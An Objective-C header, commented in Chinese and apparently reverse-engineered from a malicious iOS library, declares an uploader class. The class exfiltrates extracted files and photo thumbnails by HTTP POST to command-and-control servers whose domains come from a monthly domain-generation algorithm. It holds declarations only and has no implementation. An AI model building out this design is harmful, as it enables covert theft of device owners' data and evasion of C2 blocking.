// SimpleUploader.h - 远程上传器
// 逆向自 libappcore.dylib (SimpleUploader 类)
#pragma once
#import <Foundation/Foundation.h>

// 远程数据上传器
// 将提取的数据通过 HTTP POST 上传到远程服务器
@interface SimpleUploader : NSObject

@property (nonatomic, strong) NSURL* baseURL;
@property (nonatomic, strong) NSURLSession* session;
@property (nonatomic, copy) NSString* acquisitionId;
@property (nonatomic, copy) NSString* osVersion;
@property (nonatomic, copy) NSString* bundleId;

// 用基础 URL 初始化
- (instancetype)initWithBaseURL:(NSURL*)baseURL;

// 用 DGA 生成的域名初始化 (MonthlyCycleDGA)
- (instancetype)initWithDGASeed:(uint32_t)seed;

// 上传单个文件
- (void)uploadFile:(NSString*)filePath withType:(NSString*)type;

// 批量上传缩略图
- (void)uploadThumbBatch:(NSArray*)thumbPaths;

// 上传数据
- (void)uploadData:(NSData*)data withName:(NSString*)name type:(NSString*)type;

// 构造请求
- (NSMutableURLRequest*)requestWithURL:(NSURL*)url;

// MonthlyCycleDGA: 根据当前年月和种子生成 C2 域名
+ (NSString*)generateDomainForYear:(int)year month:(int)month seed:(uint32_t)seed;

// 获取当前月份的 DGA 域名
+ (NSString*)currentMonthDomainWithSeed:(uint32_t)seed;

@end
